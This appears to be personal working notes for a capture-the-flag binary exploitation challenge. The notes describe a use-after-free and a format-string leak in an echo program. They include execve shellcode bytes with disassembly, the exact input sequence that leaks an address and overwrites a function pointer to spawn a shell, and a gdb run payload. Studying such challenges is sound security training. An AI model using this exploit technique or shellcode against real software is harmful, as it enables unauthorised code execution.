set context-clear-screen on
set context-sections "regs disasm stack"
context backtrace --off
cwatch execute "x/4x $ebp-32"
set show-compact-regs on
regs, disasm, code, ghidra, stack, backtrace, expressions, threads, heap_tracker, last_signal

fgets does NOT terminate on null

buf at      0x6032a0 -> buf[16] at      0x6032b0    x/16x 0x6032a0
e3buf at    0x6042e0 -> e3buf[16] at    0x6042f0    x/6i 0x6042f0
id at       0x6020a0
name at     0x7fffffffea00

the program allocates a 40 byte 'buf':
    the first 24 bytes are (supposed to be) the user's name
        when the user first enters their name, the first 4 bytes are stored in 'id'
        the name is ALSO stored on the stack!!!
    the next 8 are a pointer to the function greetings(), which is called at the start of echo2() and echo3()
    the last 8 are a pointer to the function byebye(), which is called at the end of echo2() and echo3()
EXP1: exiting the program through the (4) menu frees 'buf', EVEN if the user cancels the exit request
EXP2: menu (2) -- FSB echo, echo2() -- asks for a string s (up to 32 chars, stored on the stack) and calls printf(s)
    so we can give it "%[n]$p" to print the address of the nth argument
        POSIX specifies that errno is set on error. It also specifies additional conversion specifications, most notably support for argument reordering (n$ immediately after % indicates nth argument). https://en.cppreference.com/w/c/io/fprintf
    x64 SYSV: first 6 args are in registers RDI-RSI-RDX-RCX-R8-R9, then following from stack esp | esp-0x8 | esp - 0xa...
    in echo2(), at time of get_input->printf(), the 10th argument (4th item on stack) contains rbp: top of main()'s stack
    subtracting by 0x20 then yields &name
echo3 mallocs 32 bytes of memory for the user to input something, echoes it back, then frees it
    freeing it modifies the first 16 bytes, but leaves the last 16 intact -- so we can control the contents of e3buf[16:]
    if the 'buf' is freed through EXP1, then echo3's malloc will return a pointer to 'buf' -- so we can control the contents of buf[16:]
        importantly, this includes buf[24:], which nominally contains a pointer to greetings()

https://axcheron.github.io/exploit-101-format-strings/

so:
    1. start program and install shellcode into 'name'
    2. call echo3 and install "/usr/bin/sh" at e3buf[16]
    3. do EXP2 to leak address of &name
    4. do EXP1 to free 'buf'
    5. call echo3 and install &name at buf[24]
    6. call echo2() or echo3()

\xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n
3\nAAAABBBBCCCCDDDD/usr/bin/sh\x00\n
2\n%10$p\n
4\nn\n
3\nAAAABBBBCCCCDDDDEEEEFFFF[&name]
2\n

shellcode (18 bytes):  \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05
    b8 3b 00 00 00  mov    eax,0x3b     ; execve()
    bf f0 42 60 00  mov    edi,0x6042f0 ; arg0 (filename) -- stored at e3buf[16]
    48 31 f6        xor    rsi,rsi      ; arg1 (argv)
    48 31 d2        xor    rdx,rdx      ; arg2 (envp)
    0f 05           syscall             ; 




------------------ no: free() overwrites the first 16 bytes
go through prompts to set up exploit| NAME\n4\nn\n3\n
(13) store /usr/bin/sh at buf[0]    | /usr/bin/sh\x00\x00
(17) store shellcode at buf[13]     | \xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05
(2)  pad to reach buf[32]           | \x00\x00
store &buf[13] at buf[32]           | \xa0\x32\x60\x00\x00\x00\x00\x00

run <<< $(printf "NAME\n4\nn\n3\n/usr/bin/sh\x00\x00\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05\x00\x00\xa0\x32\x60\x00\x00\x00\x00\x00")


shellcode: 17 bytes
    mov     rdi, 0x6032a0       ; arg0 (filename) -- stored in buf[0]
    mov     rsi, 0x6032b0       ; arg1 (argv)
    mov     rdx, 0x6032b0       ; arg2 (envp)
    syscall
    
\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05

0x6032a0:       0x7273752f      0x6e69622f      0x0068732f      0x32a0bf00
0x6032b0:       0xb0be0060      0xba006032      0x006032b0      0x0000050f


-----------too complicated
store &(buf[8]) at buf[0]
store "usr/bin/sh" at buf[8]
store &clib->system() at buf[32]
1. enter name
2. do exit->n. this frees the buf, allowing malloc to assign to it
3. do UAF echo (3): input 24 bytes, then 8 byte pointer to clib 'system'
4. do UAF echo (3): input  -> echo(3) will call system(